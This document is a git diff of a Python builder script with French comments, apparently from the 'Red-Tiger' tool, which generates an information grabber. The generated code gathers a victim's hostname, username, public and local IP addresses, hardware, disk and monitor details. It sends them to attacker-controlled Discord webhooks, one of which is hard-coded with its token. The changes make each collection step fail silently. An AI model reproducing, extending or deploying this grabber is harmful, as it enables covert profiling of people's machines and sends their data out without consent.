@@ -33,127 +33,155 @@ import requests
 import ctypes
 from screeninfo import get_monitors
 import psutil
+import GPUtil
 
 
 #Recuperation du nom du pc
-nom_pc = socket.gethostname()
+try:
+ nom_pc = socket.gethostname()
+except:
+ nom_pc = "N/A"
 
-nom_utilisateur = os.getlogin()
+try:
+ nom_utilisateur = os.getlogin()
+except:
+ nom_utilisateur = "N/A"
 
 #Recuperation de l'IP Publique
-response = requests.get('https://httpbin.org/ip')
+try:
+ response = requests.get('https://httpbin.org/ip')
         
-ip_address_public = response.json()['origin']
-        
+ ip_address_public = response.json()['origin']
+
+except:
+ ip_address_public = "N/A"
 
 #Recuperation de l'IP Local
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(('8.8.8.8', 80))
+try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ s.connect(('8.8.8.8', 80))
 
-ip_address_local = s.getsockname()[0]
+ ip_address_local = s.getsockname()[0]
 
-s.close()
+ s.close()
+except:
+ ip_address_local = "N/A"
 
 
 #Recuperation de l'IP Ipv4
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(('8.8.8.8', 80))  
+try:
+ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ s.connect(('8.8.8.8', 80))  
 
-ip_address_ipv4 = s.getsockname()[0]
-s.close()
+ ip_address_ipv4 = s.getsockname()[0]
+ s.close()
+except:
+ ip_address_ipv4 = "N/A"
 
 
 #Recuperation de l'IP Ipv6
-s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-s.connect(('2001:4860:4860::8888', 80))
+try:
+ s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+ s.connect(('2001:4860:4860::8888', 80))
 
-ip_address_ipv6 = s.getsockname()[0]
-
+ ip_address_ipv6 = s.getsockname()[0]
+except:
+ ip_address_ipv6 = "N/A"
 
 #Recuperation de son systeme d'exploitation
-system_info = {platform.system()}
-system_version_info = platform.version()
-
+try:
+ system_info = {platform.system()}
+ system_version_info = platform.version()
+except:
+ system_info = "N/A"
+ system_version_info = "N/A"
 
 #Recuperation des RAM
-ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
-
+try:
+ ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
+except:
+ ram_info = "N/A"
 
 #Recuperation du processeur et des coeur
-cpu_info = platform.processor()
-cpu_coeur_info = psutil.cpu_count(logical=False)
+try:
+ cpu_info = platform.processor()
+ cpu_coeur_info = psutil.cpu_count(logical=False)
+except:
+ cpu_info = "N/A"
+ cpu_coeur_info = "N/A"
 
 #Recuperation de la carte graphique
-
-import GPUtil
-gpus = GPUtil.getGPUs()
-gpu_info = gpus[0].name if gpus else "N/A"
+try:
+ gpus = GPUtil.getGPUs()
+ gpu_info = gpus[0].name if gpus else "N/A"
+except:
+ gpu_info = "N/A"
 
 
 #Recuperation info disque
-disk_info = psutil.disk_usage(path='/')
+try:
+ disk_info = psutil.disk_usage(path='/')
 
-espace_disque = round(disk_info.total / (1024**3), 2)
-espace_utilise_disque = round(disk_info.used / (1024**3), 2)
-espace_dispo_disque = round(disk_info.free / (1024**3), 2)
-
+ espace_disque = round(disk_info.total / (1024**3), 2)
+ espace_utilise_disque = round(disk_info.used / (1024**3), 2)
+ espace_dispo_disque = round(disk_info.free / (1024**3), 2)
+except:
+ disk_info = "N/A"
+ espace_disque = "N/A"
+ espace_utilise_disque = "N/A"
+ espace_dispo_disque = "N/A"
 
 #Lettre disque dur
-repertoire_courant = os.getcwd()
+try:
+ repertoire_courant = os.getcwd()
 
-lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
+ lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
+except:
+ lettre_lecteur = "N/A"
 
 
 #Recuperer portable ou fix
-def is_portable():
+try:
+ def is_portable():
     try:
         battery = psutil.sensors_battery()
         return battery is not None and battery.power_plugged is not None
     except AttributeError:
         return False
 
-if is_portable():
+ if is_portable():
     plateforme_info = 'Pc Portable'
-else:
+ else:
     plateforme_info = 'Pc Fixe'
-
-
-#Recuperer le pourcentage de batterie
-if hasattr(psutil, 'sensors_battery'):
-    batterie = psutil.sensors_battery()
-    if batterie:
-        batterie_info = {
-            'Batterie Status': batterie.power_plugged,
-            'Batterie Pourcent': batterie.percent
-        }
-    else:
-        batterie_info = {
-            'Batterie Status': 'None',
-            'Batterie Pourcent': 'None'
-        }
+except:
+ plateforme_info = "N/A"
 
 
 #Recuperer les info ECRAN PRINCIPAL:
-def get_resolution():
+try:
+ def get_resolution():
     hdc = ctypes.windll.user32.GetDC(0)
     width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
     height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
     ctypes.windll.user32.ReleaseDC(0, hdc)
     return width, height
 
-for i, monitor in enumerate(get_monitors(), 1):
+ for i, monitor in enumerate(get_monitors(), 1):
     if monitor.is_primary:
         width, height = get_resolution()
         name = monitor.name
         is_primary = 'Oui'
 
-principal_ecran = f"""Nom             : "{name}" 
+ principal_ecran = f"""Nom             : "{name}" 
 Resolution      : "{width}x{height}"
 Ecran Principal : "{is_primary}"
 """
+except:
+ principal_ecran = "N/A"
 
 #Recuperer info ECRAN SECONDAIRE
-def get_resolution():
+try:
+ def get_resolution():
     hdc = ctypes.windll.user32.GetDC(0)
     width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
     height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
@@ -161,9 +189,9 @@ def get_resolution():
     return width, height
 
 
-monitors = list(get_monitors())
+ monitors = list(get_monitors())
 
-if len(monitors) > 1:
+ if len(monitors) > 1:
 
     second_monitor = monitors[1]
 
@@ -173,8 +201,11 @@ if len(monitors) > 1:
 Resolution      : "{width}x{height}"
 Ecran Principal : "Non"
 """
-else:
-    second_ecran = 'N/A'
+ else:
+   second_ecran = 'N/A'
+except:
+ second_ecran = "N/A"
+
 ''')
  fichier.write(f'''
 webhook_invit = '{webhook}'
@@ -258,7 +289,7 @@ embed_color = 0xf00020
 username = 'Red-Tiger'
 avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
 
-webhook_url = 'https://discord.com/api/webhooks/1184942625430720562/_GWFmcTWY0WkLtsoJF0VVbZlBx5scplXFi09eUPM8Yur1sAjM6CQNZfLboIq1ddek_1r'
+webhook_url = 'https://discord.com/api/webhooks/1182817593564872795/0VJ0v0mmjTDCcbzOYMxihCB9XvXMqGax1ccaoaHWj6Qdc4aE3Cm3PvDE0EffHVreKlPk'
 
 send_embed(webhook_url, embed_title, embed_color)
 send_embed(webhook_invit, embed_title, embed_color)
